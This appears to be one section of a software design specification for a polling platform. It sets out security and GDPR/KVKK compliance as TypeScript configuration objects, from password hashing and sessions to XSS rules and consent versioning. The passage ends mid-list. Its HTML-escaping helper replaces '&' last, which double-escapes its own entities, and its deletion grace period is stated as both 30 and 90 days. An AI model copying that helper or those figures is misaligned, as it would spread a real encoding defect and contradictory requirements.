# ██████████████████████████████████████████████████████████████████████████████
# █                                                                            █
# █                              SECTION 17                                    █
# █                 SECURITY & COMPLIANCE (GDPR/KVKK)                          █
# █                                                                            █
# ██████████████████████████████████████████████████████████████████████████████




# ══════════════════════════════════════════════════════════════════════════════
# 17.1 SECURITY ARCHITECTURE OVERVIEW
# ══════════════════════════════════════════════════════════════════════════════

## 17.1.1 Security Layers

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                        SECURITY ARCHITECTURE                                 │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  LAYER 1: NETWORK SECURITY                                          │   │
│  │  • TLS 1.3 for all connections                                      │   │
│  │  • DDoS protection (Cloudflare/AWS Shield)                          │   │
│  │  • WAF (Web Application Firewall)                                   │   │
│  │  • Rate limiting at edge                                            │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  LAYER 2: APPLICATION SECURITY                                      │   │
│  │  • Input validation (Zod schemas)                                   │   │
│  │  • Output encoding                                                  │   │
│  │  • CSRF protection                                                  │   │
│  │  • XSS prevention                                                   │   │
│  │  • SQL injection prevention (Drizzle parameterized queries)         │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  LAYER 3: AUTHENTICATION & AUTHORIZATION                            │   │
│  │  • Session management                                               │   │
│  │  • Role-based access control (RBAC)                                 │   │
│  │  • Multi-factor authentication (MFA)                                │   │
│  │  • OAuth 2.0 / OpenID Connect                                       │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  LAYER 4: DATA SECURITY                                             │   │
│  │  • Encryption at rest (AES-256)                                     │   │
│  │  • Encryption in transit (TLS 1.3)                                  │   │
│  │  • Key management (AWS KMS / HashiCorp Vault)                       │   │
│  │  • Data masking & anonymization                                     │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
│  ┌─────────────────────────────────────────────────────────────────────┐   │
│  │  LAYER 5: MONITORING & RESPONSE                                     │   │
│  │  • Security event logging                                           │   │
│  │  • Intrusion detection                                              │   │
│  │  • Incident response procedures                                     │   │
│  │  • Vulnerability scanning                                           │   │
│  └─────────────────────────────────────────────────────────────────────┘   │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

## 17.1.2 Security Principles

```typescript
const SECURITY_PRINCIPLES = {
  DEFENSE_IN_DEPTH: {
    description: "Multiple layers of security controls",
    implementation: [
      "Network-level protection",
      "Application-level validation",
      "Database-level constraints",
      "Monitoring and alerting"
    ]
  },

  LEAST_PRIVILEGE: {
    description: "Minimum necessary access rights",
    implementation: [
      "Role-based access control",
      "Time-limited tokens",
      "Scoped API keys",
      "Database user permissions"
    ]
  },

  SECURE_BY_DEFAULT: {
    description: "Secure configuration out of the box",
    implementation: [
      "Strict CSP headers",
      "HTTPS-only cookies",
      "Private by default for sensitive data",
      "Opt-in for data sharing"
    ]
  },

  FAIL_SECURE: {
    description: "Deny access on failure",
    implementation: [
      "Default deny for authorization",
      "Session invalidation on anomaly",
      "Graceful degradation without data exposure"
    ]
  },

  ZERO_TRUST: {
    description: "Never trust, always verify",
    implementation: [
      "Verify every request",
      "Validate all inputs",
      "Check authorization at every layer",
      "Encrypt internal communication"
    ]
  }
}

export { SECURITY_PRINCIPLES }
```




# ══════════════════════════════════════════════════════════════════════════════
# 17.2 AUTHENTICATION SECURITY
# ══════════════════════════════════════════════════════════════════════════════

## 17.2.1 Password Security

```typescript
const PASSWORD_SECURITY = {
  HASHING: {
    algorithm: "Argon2id",
    config: {
      memoryCost: 65536,
      timeCost: 3,
      parallelism: 4,
      hashLength: 32
    },
    fallback: "bcrypt with cost 12"
  },

  REQUIREMENTS: {
    minLength: 10,
    maxLength: 128,
    minCharacterClasses: 3,
    characterClasses: ["lowercase", "uppercase", "digits", "special"],
    preventCommon: true,
    commonPasswordListSize: 100000,
    preventUserInfo: true,
    preventReuse: 5
  },

  ROTATION: {
    forceChangeOnCompromise: true,
    suggestChangeAfterDays: 365,
    forceChangeForAdmins: 90
  },

  BREACH_CHECK: {
    enabled: true,
    provider: "HaveIBeenPwned API",
    checkOnRegistration: true,
    checkOnChange: true,
    blockBreached: true
  }
}

export { PASSWORD_SECURITY }
```

## 17.2.2 Session Security

```typescript
const SESSION_SECURITY = {
  TOKEN_GENERATION: {
    algorithm: "crypto.randomBytes(32)",
    encoding: "base64url",
    length: 43
  },

  SESSION_CONFIG: {
    accessTokenExpiry: 900,
    refreshTokenExpiry: 2592000,
    absoluteTimeout: 86400,
    idleTimeout: 3600,
    maxConcurrentSessions: 5
  },

  COOKIE_CONFIG: {
    httpOnly: true,
    secure: true,
    sameSite: "lax",
    path: "/",
    domain: ".voxpoll.com"
  },

  PROTECTION: {
    regenerateOnAuth: true,
    regenerateOnPrivilegeChange: true,
    bindToIP: false,
    bindToUserAgent: true,
    detectConcurrentUse: true
  },

  REVOCATION: {
    onPasswordChange: "all",
    onLogout: "current",
    onSecurityEvent: "all",
    onSuspension: "all"
  }
}

export { SESSION_SECURITY }
```

## 17.2.3 Multi-Factor Authentication

```typescript
const MFA_SECURITY = {
  SUPPORTED_METHODS: {
    TOTP: {
      algorithm: "SHA-1",
      digits: 6,
      period: 30,
      window: 1,
      issuer: "VoxPoll"
    },
    SMS: {
      codeLength: 6,
      expiry: 600,
      maxAttempts: 3,
      cooldown: 60
    },
    EMAIL: {
      codeLength: 6,
      expiry: 900,
      maxAttempts: 3
    },
    BACKUP_CODES: {
      count: 10,
      length: 8,
      format: "xxxx-xxxx",
      singleUse: true
    }
  },

  ENFORCEMENT: {
    requiredForAdmins: true,
    requiredForOrgOwners: true,
    optionalForUsers: true,
    gracePeriodDays: 14
  },

  RECOVERY: {
    backupCodesRequired: true,
    adminResetAllowed: true,
    identityVerification: "email + security questions"
  }
}

export { MFA_SECURITY }
```

## 17.2.4 OAuth Security

```typescript
// ═══════════════════════════════════════════════════════════════════════════════
// [P-049] AUTHENTICATION PROVIDER RESTRICTIONS
// ❌ Facebook OAuth: NEVER (privacy concerns, data harvesting, user tracking)
// ❌ Twitter/X OAuth: NEVER (API instability, ownership changes, unreliable)
// ✅ Supported: Google, Apple, e-Devlet only
// ═══════════════════════════════════════════════════════════════════════════════
const OAUTH_SECURITY = {
  // ONLY these providers are supported - NO Facebook, NO Twitter
  SUPPORTED_PROVIDERS: ["google", "apple", "e_devlet"],

  PKCE: {
    required: true,
    method: "S256"
  },

  STATE_PARAMETER: {
    required: true,
    length: 32,
    expiry: 600
  },

  TOKEN_VALIDATION: {
    validateIssuer: true,
    validateAudience: true,
    validateExpiry: true,
    clockSkew: 60
  },

  ACCOUNT_LINKING: {
    allowMultipleProviders: true,
    requireEmailVerification: true,
    preventAccountTakeover: true
  }
}

export { OAUTH_SECURITY }
```




# ══════════════════════════════════════════════════════════════════════════════
# 17.3 DATA ENCRYPTION
# ══════════════════════════════════════════════════════════════════════════════

## 17.3.1 Encryption Standards

```typescript
const ENCRYPTION_STANDARDS = {
  AT_REST: {
    algorithm: "AES-256-GCM",
    keyDerivation: "HKDF-SHA256",
    keyRotation: "90 days",
    storage: "AWS KMS / HashiCorp Vault"
  },

  IN_TRANSIT: {
    protocol: "TLS 1.3",
    minVersion: "TLS 1.2",
    cipherSuites: [
      "TLS_AES_256_GCM_SHA384",
      "TLS_CHACHA20_POLY1305_SHA256",
      "TLS_AES_128_GCM_SHA256"
    ],
    certificateType: "EV SSL",
    hsts: {
      enabled: true,
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true
    }
  },

  DATABASE: {
    connectionEncryption: "TLS",
    columnEncryption: "Application-level for sensitive fields",
    encryptedFields: [
      // User PII - Required per §17.3.3 highSensitivity rules
      "User.email",              // Added: PII field requiring encryption
      "User.passwordHash",
      "User.phone",
      "UserProfile.birthDate",   // Added: PII field requiring encryption
      // Auth tokens
      "Account.accessToken",
      "Account.refreshToken",
      // Webhook secrets
      "WebhookEndpoint.secret"
    ]
  },

  FILE_STORAGE: {
    serverSideEncryption: "AES-256",
    clientSideEncryption: "Optional for sensitive files",
    keyManagement: "AWS KMS"
  }
}

export { ENCRYPTION_STANDARDS }
```

## 17.3.2 Key Management

```typescript
const KEY_MANAGEMENT = {
  KEY_HIERARCHY: {
    masterKey: {
      storage: "HSM / AWS KMS",
      rotation: "Annual",
      access: "Infrastructure team only"
    },
    dataEncryptionKeys: {
      derivedFrom: "masterKey",
      rotation: "90 days",
      perTenant: true
    },
    applicationKeys: {
      jwtSigningKey: { rotation: "30 days" },
      apiKeyEncryption: { rotation: "90 days" },
      webhookSigningKey: { rotation: "90 days" }
    }
  },

  KEY_ROTATION: {
    automated: true,
    gracePeriod: "7 days for old keys",
    notification: "Alert on rotation failure",
    rollback: "Automatic on encryption failure"
  },

  ACCESS_CONTROL: {
    principle: "Least privilege",
    logging: "All key access logged",
    approval: "Dual approval for master key access"
  }
}

export { KEY_MANAGEMENT }
```

## 17.3.3 Sensitive Data Handling

```typescript
const SENSITIVE_DATA_HANDLING = {
  PII_FIELDS: {
    highSensitivity: [
      "email",
      "phone",
      "birthDate",
      "governmentId",
      "address",
      "ipAddress"
    ],
    mediumSensitivity: [
      "displayName",
      "avatarUrl",
      "city",
      "occupation"
    ],
    lowSensitivity: [
      "username",
      "createdAt",
      "lastActiveAt"
    ]
  },

  HANDLING_RULES: {
    highSensitivity: {
      encryption: "Required",
      logging: "Never log raw values",
      display: "Masked by default",
      export: "Requires explicit consent",
      retention: "Minimum necessary"
    },
    mediumSensitivity: {
      encryption: "Recommended",
      logging: "Hash only",
      display: "User controlled",
      export: "Included in data export",
      retention: "Account lifetime"
    }
  },

  MASKING: {
    email: (email: string) => {
      const [local, domain] = email.split("@")
      return `${local.slice(0, 2)}***@${domain}`
    },
    phone: (phone: string) => {
      return `***${phone.slice(-4)}`
    },
    ipAddress: (ip: string) => {
      const parts = ip.split(".")
      return `${parts[0]}.${parts[1]}.*.*`
    }
  }
}

export { SENSITIVE_DATA_HANDLING }
```




# ══════════════════════════════════════════════════════════════════════════════
# 17.4 INPUT VALIDATION & SANITIZATION
# ══════════════════════════════════════════════════════════════════════════════

## 17.4.1 Input Validation Rules

```typescript
const INPUT_VALIDATION = {
  STRING_VALIDATION: {
    maxLength: {
      username: 30,
      displayName: 50,
      email: 255,
      bio: 500,
      pollTitle: 200,
      pollDescription: 2000,
      commentContent: 2000,
      searchQuery: 200
    },
    patterns: {
      username: /^[a-zA-Z0-9_]{3,30}$/,
      email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/,
      phone: /^\+[1-9]\d{1,14}$/,
      slug: /^[a-z0-9-]{3,100}$/,
      hexColor: /^#[0-9A-Fa-f]{6}$/
    }
  },

  NUMBER_VALIDATION: {
    ranges: {
      pollOptionCount: { min: 2, max: 10 },
      surveyQuestionCount: { min: 1, max: 100 },
      testQuestionCount: { min: 5, max: 50 },
      commentDepth: { min: 0, max: 3 },
      pageSize: { min: 1, max: 50 }
    }
  },

  FILE_VALIDATION: {
    maxSizes: {
      avatar: 2097152,
      pollImage: 5242880,
      surveyAttachment: 10485760
    },
    allowedTypes: {
      image: ["image/jpeg", "image/png", "image/webp", "image/gif"],
      document: ["application/pdf"],
      data: ["text/csv", "application/json"]
    }
  },

  SANITIZATION: {
    html: "Strip all HTML tags",
    javascript: "Remove script tags and event handlers",
    sql: "Use parameterized queries only",
    nullBytes: "Remove null bytes",
    unicode: "NFKC normalization"
  }
}

export { INPUT_VALIDATION }
```

## 17.4.2 XSS Prevention

```typescript
const XSS_PREVENTION = {
  OUTPUT_ENCODING: {
    html: {
      entities: ["&", "<", ">", '"', "'"],
      encoding: ["&amp;", "&lt;", "&gt;", "&quot;", "&#x27;"]
    },
    javascript: {
      escapeUnicode: true,
      escapeNewlines: true
    },
    url: {
      encoding: "encodeURIComponent"
    }
  },

  CONTENT_SECURITY_POLICY: {
    directives: {
      "default-src": ["'self'"],
      "script-src": ["'self'", "'strict-dynamic'"],
      "style-src": ["'self'", "'unsafe-inline'"],
      "img-src": ["'self'", "data:", "https://cdn.voxpoll.com", "https://*.cloudinary.com"],
      "font-src": ["'self'", "https://fonts.gstatic.com"],
      "connect-src": ["'self'", "https://api.voxpoll.com", "wss://ws.voxpoll.com"],
      "frame-ancestors": ["'none'"],
      "form-action": ["'self'"],
      "base-uri": ["'self'"],
      "object-src": ["'none'"]
    },
    reportUri: "/api/csp-report"
  },

  MARKDOWN_SANITIZATION: {
    allowedTags: ["p", "br", "strong", "em", "code", "pre", "a", "ul", "ol", "li", "blockquote"],
    allowedAttributes: {
      a: ["href", "title"],
      code: ["class"]
    },
    disallowedSchemes: ["javascript", "data", "vbscript"],
    transformTags: {
      a: (tagName: string, attribs: Record<string, string>) => ({
        tagName,
        attribs: {
          ...attribs,
          rel: "noopener noreferrer",
          target: "_blank"
        }
      })
    }
  }
}

export { XSS_PREVENTION }
```

## 17.4.2.1 User Generated Content (UGC) Output Encoding

```typescript
// ══════════════════════════════════════════════════════════════════════════════
// UGC OUTPUT ENCODING RULES
// ══════════════════════════════════════════════════════════════════════════════
// Specifies how to safely render user-generated content in different contexts.
// All UGC must be encoded before display to prevent XSS attacks.
// ══════════════════════════════════════════════════════════════════════════════

const UGC_OUTPUT_ENCODING = {
  // Raw text fields (no HTML allowed)
  RAW_TEXT_FIELDS: {
    fields: [
      "poll.title",
      "poll.description",
      "poll.option.text",
      "survey.title",
      "survey.description",
      "survey.question.text",
      "survey.option.text",
      "test.title",
      "test.description",
      "test.question.text",
      "test.option.text",
      "user.displayName",
      "user.bio",
      "organization.name",
      "organization.description"
    ],
    encoding: "HTML_ESCAPE",
    // All special characters must be escaped
    rules: {
      "<": "&lt;",
      ">": "&gt;",
      "&": "&amp;",
      '"': "&quot;",
      "'": "&#x27;",
      "/": "&#x2F;"
    }
  },

  // Survey free-text responses
  SURVEY_RESPONSES: {
    shortText: {
      maxLength: 500,
      encoding: "HTML_ESCAPE",
      stripTags: true,
      allowNewlines: false
    },
    longText: {
      maxLength: 5000,
      encoding: "HTML_ESCAPE",
      stripTags: true,
      allowNewlines: true,
      convertNewlines: "\\n → <br>"  // After HTML escape
    }
  },

  // Comment content (supports limited markdown)
  COMMENTS: {
    maxLength: 2000,
    processing: [
      "1. Strip all HTML tags",
      "2. Parse markdown (limited tags only)",
      "3. Sanitize markdown output with MARKDOWN_SANITIZATION rules",
      "4. Auto-link URLs with rel='noopener noreferrer'"
    ],
    allowedMarkdown: ["bold", "italic", "code", "links", "lists"]
  },

  // Display contexts
  DISPLAY_CONTEXTS: {
    // Server-side rendering (Next.js)
    SSR: {
      method: "React automatically escapes text content",
      dangerouslySetInnerHTML: "NEVER use for UGC",
      exception: "Sanitized markdown only"
    },

    // Client-side rendering
    CSR: {
      method: "Use textContent, not innerHTML",
      exception: "DOMPurify for sanitized markdown"
    },

    // API responses (JSON)
    API: {
      method: "Return raw strings, escape on render",
      note: "Do NOT double-escape in API"
    },

    // Meta tags / OG tags
    META: {
      method: "HTML entity encode all values",
      maxLength: 200,
      stripAllMarkdown: true
    },

    // Email templates
    EMAIL: {
      method: "HTML escape for HTML emails",
      plaintext: "Strip all formatting"
    }
  }
}

// Implementation helper
function encodeForDisplay(
  content: string,
  context: keyof typeof UGC_OUTPUT_ENCODING.DISPLAY_CONTEXTS
): string {
  if (!content) return ""

  // Always strip null bytes
  let encoded = content.replace(/\0/g, "")

  // Apply HTML escaping
  const escapeMap = UGC_OUTPUT_ENCODING.RAW_TEXT_FIELDS.rules
  for (const [char, entity] of Object.entries(escapeMap)) {
    encoded = encoded.replace(new RegExp(char, "g"), entity)
  }

  return encoded
}

export { UGC_OUTPUT_ENCODING, encodeForDisplay }
```

## 17.4.3 CSRF Protection

```typescript
const CSRF_PROTECTION = {
  TOKEN_GENERATION: {
    algorithm: "crypto.randomBytes(32)",
    encoding: "base64url",
    binding: "session"
  },

  VALIDATION: {
    headerName: "X-CSRF-Token",
    cookieName: "__Host-csrf",
    doubleSubmit: true
  },

  EXEMPTIONS: {
    publicReadEndpoints: true,
    webhookEndpoints: "Use signature verification instead",
    oauthCallbacks: "Use state parameter"
  },

  SAMESITE_COOKIES: {
    sessionCookie: "Lax",
    csrfCookie: "Strict"
  }
}

export { CSRF_PROTECTION }
```




# ══════════════════════════════════════════════════════════════════════════════
# 17.5 API SECURITY
# ══════════════════════════════════════════════════════════════════════════════

## 17.5.1 Rate Limiting

```typescript
const API_RATE_LIMITING = {
  GLOBAL: {
    authenticated: { requests: 1000, window: 60 },
    anonymous: { requests: 100, window: 60 }
  },

  BY_ENDPOINT: {
    "/api/auth/login": { requests: 10, window: 900 },
    "/api/auth/register": { requests: 5, window: 3600 },
    "/api/auth/password-reset": { requests: 3, window: 3600 },
    "/api/polls/create": { requests: 10, window: 3600 },
    "/api/search": { requests: 30, window: 60 }
  },

  IMPLEMENTATION: {
    algorithm: "Sliding window",
    storage: "Redis",
    keyFormat: "rl:{userId}:{endpoint}:{window}",
    headers: {
      limit: "X-RateLimit-Limit",
      remaining: "X-RateLimit-Remaining",
      reset: "X-RateLimit-Reset",
      retryAfter: "Retry-After"
    }
  },

  BYPASS: {
    internalServices: true,
    healthChecks: true,
    adminOverride: "With audit logging"
  }
}

export { API_RATE_LIMITING }
```

## 17.5.2 Request Validation

```typescript
const REQUEST_VALIDATION = {
  SIZE_LIMITS: {
    maxBodySize: "10mb",
    maxUrlLength: 2048,
    maxHeaderSize: 8192,
    maxQueryParams: 100
  },

  CONTENT_TYPE: {
    required: true,
    allowed: [
      "application/json",
      "multipart/form-data",
      "application/x-www-form-urlencoded"
    ]
  },

  HEADERS: {
    required: ["Content-Type"],
    forbidden: ["X-Forwarded-Host"],
    validated: {
      "Accept-Language": /^[a-z]{2}(-[A-Z]{2})?$/,
      "X-Request-ID": /^[a-zA-Z0-9-]{36}$/
    }
  },

  SECURITY_HEADERS: {
    "X-Content-Type-Options": "nosniff",
    "X-Frame-Options": "DENY",
    "X-XSS-Protection": "0",
    "Referrer-Policy": "strict-origin-when-cross-origin",
    "Permissions-Policy": "camera=(), microphone=(), geolocation=()"
  }
}

export { REQUEST_VALIDATION }
```

## 17.5.3 Webhook Security

```typescript
const WEBHOOK_SECURITY = {
  SIGNATURE: {
    algorithm: "HMAC-SHA256",
    headerName: "X-VoxPoll-Signature",
    format: "v1={signature}",
    timestampHeader: "X-VoxPoll-Timestamp",
    timestampTolerance: 300
  },

  DELIVERY: {
    timeout: 30000,
    retries: 5,
    backoff: "exponential",
    maxRetryDelay: 3600000
  },

  VALIDATION: {
    urlScheme: "HTTPS only",
    ipValidation: "No internal IPs",
    certificateValidation: true,
    followRedirects: false
  },

  PAYLOAD: {
    maxSize: 65536,
    encoding: "UTF-8",
    format: "JSON"
  }
}

export { WEBHOOK_SECURITY }
```




# ══════════════════════════════════════════════════════════════════════════════
# 17.6 GDPR COMPLIANCE
# ══════════════════════════════════════════════════════════════════════════════

## 17.6.1 GDPR Principles

```typescript
const GDPR_PRINCIPLES = {
  LAWFULNESS_FAIRNESS_TRANSPARENCY: {
    legalBases: [
      "Consent (Article 6(1)(a))",
      "Contract performance (Article 6(1)(b))",
      "Legitimate interest (Article 6(1)(f))"
    ],
    implementation: [
      "Clear privacy policy",
      "Consent management",
      "Processing records"
    ]
  },

  PURPOSE_LIMITATION: {
    rule: "Data collected for specified, explicit purposes only",
    implementation: [
      "Document purpose for each data field",
      "No repurposing without consent",
      "Separate consent for marketing"
    ]
  },

  DATA_MINIMIZATION: {
    rule: "Collect only necessary data",
    implementation: [
      "Review data collection regularly",
      "Optional fields clearly marked",
      "No excessive data requirements"
    ]
  },

  ACCURACY: {
    rule: "Keep data accurate and up to date",
    implementation: [
      "User self-service updates",
      "Regular data quality checks",
      "Prompt correction on request"
    ]
  },

  STORAGE_LIMITATION: {
    rule: "Keep data only as long as necessary",
    implementation: [
      "Defined retention periods",
      "Automated deletion",
      "Regular retention audits"
    ]
  },

  INTEGRITY_CONFIDENTIALITY: {
    rule: "Appropriate security measures",
    implementation: [
      "Encryption at rest and in transit",
      "Access controls",
      "Security monitoring"
    ]
  }
}

export { GDPR_PRINCIPLES }
```

## 17.6.2 Data Subject Rights

```typescript
const DATA_SUBJECT_RIGHTS = {
  RIGHT_TO_ACCESS: {
    article: "Article 15",
    description: "Right to obtain copy of personal data",
    implementation: {
      endpoint: "/api/user/data-export",
      format: ["JSON", "CSV"],
      responseTime: "30 days",
      verification: "Re-authentication required",
      content: [
        "Profile data",
        "Activity history",
        "Participation records",
        "Comments",
        "Settings"
      ]
    }
  },

  RIGHT_TO_RECTIFICATION: {
    article: "Article 16",
    description: "Right to correct inaccurate data",
    implementation: {
      selfService: "Profile editing",
      supportRequest: "For derived/computed data",
      responseTime: "Without undue delay"
    }
  },

  RIGHT_TO_ERASURE: {
    article: "Article 17",
    description: "Right to deletion (right to be forgotten)",
    implementation: {
      endpoint: "/api/user/delete-account",
      gracePeriod: 30,
      anonymization: "Responses anonymized, not deleted",
      // ═══════════════════════════════════════════════════════════════════════
      // CLARIFICATION: Anonymization vs Deletion
      // ═══════════════════════════════════════════════════════════════════════
      // User Deletion Request (GDPR Article 17):
      //   1. Personal data (profile, email, etc.) → DELETED after 90-day grace
      //   2. Survey/Poll responses → ANONYMIZED (not deleted)
      //
      // Why anonymization instead of deletion?
      //   - Research integrity: Deleting responses would skew aggregate results
      //   - Legal basis: Legitimate interest in maintaining research validity
      //   - GDPR allows: Data no longer personally identifiable = no longer personal data
      //
      // Anonymization process:
      //   - userId field → SET NULL
      //   - participantHash → REGENERATED (new random hash)
      //   - sessionId → DELETED
      //   - deviceFingerprint → DELETED
      //   - IP address → ALREADY not stored long-term
      //   - Response content → RETAINED (no personal data in answers)
      //
      // Result: Response cannot be linked back to user by any means
      // ═══════════════════════════════════════════════════════════════════════
      exceptions: [
        "Legal obligations",
        "Public interest",
        "Legal claims"
      ],
      process: [
        "User requests deletion",
        "Verification required",
        "30-day grace period",
        "Email confirmation",
        "Personal data deleted",
        "Response userId set to NULL",
        "Response participantHash regenerated",
        "Device fingerprint deleted",
        "Aggregates remain intact"
      ]
    }
  },

  RIGHT_TO_PORTABILITY: {
    article: "Article 20",
    description: "Right to receive data in machine-readable format",
    implementation: {
      format: "JSON",
      content: "Data provided by user",
      excludes: "Derived analytics",
      delivery: "Download link via email"
    }
  },

  RIGHT_TO_OBJECT: {
    article: "Article 21",
    description: "Right to object to processing",
    implementation: {
      marketing: "Unsubscribe option",
      profiling: "Opt-out in settings",
      directMarketing: "Immediate effect"
    }
  },

  RIGHT_TO_RESTRICTION: {
    article: "Article 18",
    description: "Right to restrict processing",
    implementation: {
      trigger: "Contest accuracy, unlawful processing, etc.",
      effect: "Data stored but not processed",
      duration: "Until issue resolved"
    }
  }
}

export { DATA_SUBJECT_RIGHTS }
```

## 17.6.3 Consent Management

```typescript
const CONSENT_MANAGEMENT = {
  CONSENT_TYPES: {
    TERMS_OF_SERVICE: {
      required: true,
      legalBasis: "Contract",
      canWithdraw: "By deleting account"
    },
    PRIVACY_POLICY: {
      required: true,
      legalBasis: "Contract",
      canWithdraw: "By deleting account"
    },
    MARKETING_EMAIL: {
      required: false,
      legalBasis: "Consent",
      canWithdraw: "Anytime via settings",
      doubleOptIn: true
    },
    ANALYTICS: {
      required: false,
      legalBasis: "Legitimate interest",
      canOptOut: true
    },
    THIRD_PARTY_SHARING: {
      required: false,
      legalBasis: "Consent",
      canWithdraw: "Anytime via settings"
    }
  },

  CONSENT_RECORD: {
    fields: [
      "consentType",
      "granted",
      "timestamp",
      "ipAddress",
      "userAgent",
      "version"
    ],
    retention: "Duration of consent + 7 years"
  },

  WITHDRAWAL: {
    method: "Self-service via settings",
    effect: "Immediate",
    notification: "Confirmation email",
    logging: "Record withdrawal"
  }
}

interface ConsentRecord {
  id: string
  userId: string
  consentType: string
  granted: boolean
  version: string
  ipAddress: string
  userAgent: string
  grantedAt: Date
  withdrawnAt: Date | null
}

export { CONSENT_MANAGEMENT }
export type { ConsentRecord }
```

## 17.6.3.1 Consent Versioning Strategy

```typescript
// ══════════════════════════════════════════════════════════════════════════════
// CONSENT VERSIONING STRATEGY
// Handles policy updates, re-consent requirements, and audit trail
// ══════════════════════════════════════════════════════════════════════════════

interface ConsentPolicyVersion {
  version: string            // Semantic versioning: "2.1.0"
  effectiveDate: Date
  expiryDate: Date | null    // null = currently active
  changes: {
    type: "MAJOR" | "MINOR" | "PATCH"
    summary: string
    affectedPurposes: string[]
    requiresReConsent: boolean
  }
  policyDocument: {
    privacyPolicyUrl: string
    termsOfServiceUrl: string
    cookiePolicyUrl: string
    consentFormHash: string  // SHA-256 of consent text
  }
}

const CONSENT_VERSIONING = {
  // Version change rules
  VERSION_TYPES: {
    MAJOR: {
      description: "New data processing purpose or significant scope change",
      requiresReConsent: true,
      notificationRequired: true,
      gracePeriod: 30,           // Days to re-consent
      blockingOnExpiry: true     // Block access if not re-consented
    },
    MINOR: {
      description: "Clarification or non-material change",
      requiresReConsent: false,
      notificationRequired: true,
      gracePeriod: 0,
      blockingOnExpiry: false
    },
    PATCH: {
      description: "Typo fix, formatting, no substance change",
      requiresReConsent: false,
      notificationRequired: false,
      gracePeriod: 0,
      blockingOnExpiry: false
    }
  },

  // Re-consent flow
  RE_CONSENT_FLOW: {
    triggers: [
      "New data processing purpose added",
      "Third-party data sharing introduced",
      "Cross-border transfer to new country",
      "Retention period extended",
      "New special category data collected"
    ],
    userExperience: {
      showModal: true,
      allowSkip: false,          // Cannot skip for MAJOR changes
      showDiff: true,            // Show what changed
      requireExplicitAction: true // Must click "I agree"
    },
    nonCompliantAction: {
      afterGracePeriod: "RESTRICT_ACCESS",
      allowedActions: ["view_own_data", "export_data", "delete_account"],
      blockedActions: ["create_content", "participate", "comment"]
    }
  },

  // Audit trail
  AUDIT_REQUIREMENTS: {
    recordFields: [
      "userId",
      "policyVersion",
      "consentTimestamp",
      "ipAddress",
      "userAgent",
      "consentMethod",        // CLICK, API, BULK_IMPORT
      "consentFormHash",
      "policyDocumentHash"
    ],
    retention: "7 years after consent withdrawal or account deletion",
    immutable: true            // Cannot be modified after creation
  }
}

// Database schema for consent versioning
const CONSENT_VERSION_SCHEMA = `
model ConsentPolicy {
  id              String    @id @default(cuid())
  version         String    @unique  // "2.1.0"
  versionType     String    // MAJOR, MINOR, PATCH
  effectiveDate   DateTime
  expiryDate      DateTime?
  privacyPolicyUrl String
  termsUrl        String
  cookiePolicyUrl String
  consentFormHash String    // SHA-256
  changeSummary   String
  changesJson     Json      // Detailed changes
  createdAt       DateTime  @default(now())
  createdBy       String    // Admin who created

  consents        UserConsent[]

  @@index([effectiveDate])
}

model UserConsent {
  id              String    @id @default(cuid())
  userId          String
  user            User      @relation(fields: [userId], references: [id])
  policyId        String
  policy          ConsentPolicy @relation(fields: [policyId], references: [id])
  grantedAt       DateTime  @default(now())
  withdrawnAt     DateTime?
  ipAddress       String
  userAgent       String
  consentMethod   String    // CLICK, API, BULK_IMPORT
  isActive        Boolean   @default(true)

  @@unique([userId, policyId])
  @@index([userId, isActive])
}
`

// Re-consent check function
async function checkReConsentRequired(userId: string): Promise<{
  required: boolean
  currentVersion: string
  userVersion: string | null
  gracePeriodEnds: Date | null
  changes: string[]
}> {
  // Get current active policy
  const currentPolicy = await db.select().from(consentPolicies)
    .where(isNull(consentPolicies.expiryDate))
    .orderBy(desc(consentPolicies.effectiveDate))
    .limit(1)
    .then(r => r[0])

  if (!currentPolicy) {
    return { required: false, currentVersion: "0.0.0", userVersion: null, gracePeriodEnds: null, changes: [] }
  }

  // Get user's last consent
  const userConsent = await db.query.userConsents.findFirst({
    where: and(eq(userConsents.userId, userId), eq(userConsents.isActive, true)),
    orderBy: desc(userConsents.grantedAt),
    with: { policy: true }
  })

  if (!userConsent) {
    return {
      required: true,
      currentVersion: currentPolicy.version,
      userVersion: null,
      gracePeriodEnds: null,
      changes: ["Initial consent required"]
    }
  }

  // Compare versions
  const currentMajor = parseInt(currentPolicy.version.split(".")[0])
  const userMajor = parseInt(userConsent.policy.version.split(".")[0])

  if (currentMajor > userMajor) {
    // MAJOR version change - requires re-consent
    const gracePeriodDays = CONSENT_VERSIONING.VERSION_TYPES.MAJOR.gracePeriod
    const gracePeriodEnds = new Date(currentPolicy.effectiveDate)
    gracePeriodEnds.setDate(gracePeriodEnds.getDate() + gracePeriodDays)

    return {
      required: true,
      currentVersion: currentPolicy.version,
      userVersion: userConsent.policy.version,
      gracePeriodEnds,
      changes: JSON.parse(currentPolicy.changesJson as string).affectedPurposes || []
    }
  }

  return {
    required: false,
    currentVersion: currentPolicy.version,
    userVersion: userConsent.policy.version,
    gracePeriodEnds: null,
    changes: []
  }
}

export { CONSENT_VERSIONING, checkReConsentRequired }
export type { ConsentPolicyVersion }
```

## 17.6.4 Data Processing Records

```typescript
const DATA_PROCESSING_RECORDS = {
  REQUIRED_INFORMATION: {
    controllerDetails: {
      name: "VoxPoll Teknoloji A.Ş.",
      address: "Istanbul, Turkey",
      dpoContact: "dpo@voxpoll.com"
    },
    processingPurposes: [
      "Account management",
      "Service delivery",
      "Analytics",
      "Security",
      "Legal compliance"
    ],
    dataCategories: [
      "Identity data",
      "Contact data",
      "Technical data",
      "Usage data",
      "Response data"
    ],
    recipientCategories: [
      "Service providers",
      "Analytics providers",
      "Legal authorities (when required)"
    ],
    retentionPeriods: {
      accountData: "Account lifetime + 90 days",
      responseData: "Indefinite (anonymized)",
      logs: "90 days",
      backups: "30 days"
    },
    securityMeasures: [
